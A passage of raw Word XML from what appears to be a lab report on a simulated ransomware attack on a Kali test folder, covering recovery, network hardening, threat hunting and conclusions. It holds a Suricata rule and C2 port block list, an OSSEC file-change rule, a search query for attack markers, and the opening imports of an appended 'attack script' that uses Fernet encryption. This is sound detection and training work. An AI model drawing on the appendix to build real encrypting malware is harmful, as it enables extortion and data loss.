      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>ke</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5C892FF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Test file recovery process</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1601A5A5"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2. Decryption &amp; Recovery:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583C6409"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Use stored encryption key for decryption</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD696D9"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Validate file integrity post-decryption</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0665B3B0"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Restore from backup if decryption fails</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06AB2AE7"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Verify data completeness</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9989BA"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3. Network Hardening:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70458C0B"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Block C2 ports (31337, 8888) at firewall</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371A7C5B"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Implement egress filtering</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E217A5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Monitor for similar attack patterns</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35600A5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Update IDS/IPS signatures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="407898AC" w14:textId="1457DDB9"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A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">7.3 Long-term Actions (T+24 hours onwards) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D85D0C1" w14:textId="060992FF"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1. Security Improvements</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A666E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Deploy endpoint detection and response (EDR)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C5E629"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Implement file integrity monitoring (FIM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E1B889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Enable application whitelisting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3154C11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Patch vulnerable services</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B801893"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2. Detection Enhancements:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3B7FFE"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Create Suricata rule for C2 traffic:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A9FCC7"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alert </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> -&gt; any [31337,8888,8080] (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>msg:"Potential</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ransomware C2"; sid:1000001;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61533F66"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
    <w:p w14:paraId="51B4157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Create OSSEC rule for rapid file changes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A8D8F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&lt;rule id="100001" level="12"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9847EE"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&lt;description&gt;Multiple file changes in short time&lt;/description&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="590C6B3F"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&lt;group&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>syscheck</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>&lt;/group&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C7B3E68"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&lt;/rule&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F15F28D"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3. Policy &amp; Training:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7806CBB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lastRenderedPageBreak/>
        <w:t>- Update incident response playbook</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C2D43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Conduct ransomware awareness training</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48536764"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Implement backup verification procedures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42B25061"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Regular disaster recovery drills</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC2660A" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC" w:rsidP="00C324AC">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>7.4 Threat Hunting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D16E71"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Hunt for Similar Activity:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E86B29A"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Search for other potential attacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507E97B5"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curl "http://localhost:9200/debug-all-events-*/_search" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238EEBD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-d '{"query": {"bool": {"should": [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF9B4C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{"match": {"message": "RECON_CMD"}},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5299EA53"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{"match": {"message": "C2_"}},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BF416C"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{"match": {"message": "FILE_ENCRYPTED"}}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="453DD32E"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xml:space="preserve">  ]}}}'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FDB6ACB"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4F9CDAD7"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Check for abnormal process executions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8455E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Check for unusual network connections</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E14D8D" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC" w:rsidP="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BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t># Review user login patterns</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3868D5A4"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28D8CFFE"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20B00DD4" w14:textId="7F1AE3C9"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A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">8. CONCLUSION </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0F4D98"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This ransomware simulation successfully demonstrated:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F206FF2" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Attack Complexity:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Multi-stage attack with reconnaissance, C2, encryption, and exfiltration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A738BCD" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Detection Capability:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> 100% event detection rate (21/21 events)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC71F19" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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SIEM Effectiveness:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Security Onion captured and correlated all attack activities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B00E3F0" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Analysis Tools:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Kibana provided comprehensive visualization and investigation capabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C355092" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Response Framework:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Clear </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>IoCs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> and actionable remediation steps identified</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4460B78C"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Key Takeaways:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D6E4CC7" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Modern ransomware attacks are complex multi-phase operations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B843CBF" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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 xml:space="preserve">Proper logging and SIEM deployment </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>enables</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> complete attack visibility</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1B25AE" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Event correlation is critical for understanding attack progression</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B816A31" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Immediate response and recovery planning are essential</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED39571" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC" w:rsidP="00C324AC">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Final Assessment:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
        <w:t>The simulation proves that with appropriate logging infrastructure and SIEM capabilities, ransomware attacks can be detected, analyzed, and responded to effectively.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2619005F"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282FFAB4"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53B19C16"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5FBDE9E2"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13C2608A"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22FE5504"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12104DDA"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16875E0B"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622F8829"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548787A0"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6E6AF331"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1800987D"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69E6A649"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5086252C"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454CDCFB"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30C6546A" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRDefault="00C324AC" w:rsidP="00C324AC">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43A12812" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC" w:rsidP="00C324AC">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="188B11E8" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC" w:rsidP="00C324AC">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003929AA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>. APPENDICES</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3AC32E" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRDefault="00C324AC" w:rsidP="00C324AC">
      <w:r>
        <w:t>Screenshot A.1: Full Attack Script</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5E83A5" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00177E05" w:rsidRDefault="00C324AC" w:rsidP="00C324A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ru-KZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">import </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>os</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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import </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>socket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import </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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import </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>subprocess</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from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>cryptography.fernet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">import </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Fernet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from </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">datetime </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">import </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>datetime</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import </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>time</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datetime.now</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strftime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Y%m%d</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>_%H%M%S"</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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>attack_timestamp</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datetime.now</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isoformat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hostname = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>socket.gethostname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username = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>os.getenv</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'USER'</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'unknown'</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target = </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>"/home/kali/test"</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="56A8F5"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>send_to_syslog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
